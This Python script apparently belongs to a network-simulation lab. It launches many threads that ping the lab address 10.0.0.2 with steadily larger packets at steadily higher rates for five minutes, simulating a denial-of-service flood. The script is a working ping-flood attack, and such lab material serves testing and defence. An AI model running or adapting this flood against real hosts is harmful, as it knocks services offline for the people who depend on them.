import subprocess
import os
import ipaddress
import time
from time import sleep
from threading import Thread
from unicodedata import name
import os 

"""
    Perform a Dos Attack from hm to h2.
    To simulate a Dos Attack hm would have to send flows with increasing size and/or frequency, 
    until a certain value is reached wich involves the drop of some of the flows passing by for s4.
"""
IP_H2 = "10.0.0.2"


def ping_host(i):
    # Increase size for each ping
    for i in range(100, 65000, 100):
        # ping without size
        subprocess.run(["ping", "-s", str(i), "-i", str(100/i),IP_H2])


if __name__ == "__main__":
    # The DoS Attack have to start after 10 minute so we want to perfrom a 15 minute test
    t_end = time.time() + 60 * 5 # 300 s
    i = 1
    while time.time() < t_end:
    #for i in range(1,1000):
        worker = Thread(target=ping_host, args=(i,))
        workers = []
        workers.append(worker)
        worker.setDaemon(True)
        worker.start()
        # Increase frequency for each ping
        sleep(1/i)
        i += 1
    
    for w in workers:
        w.join()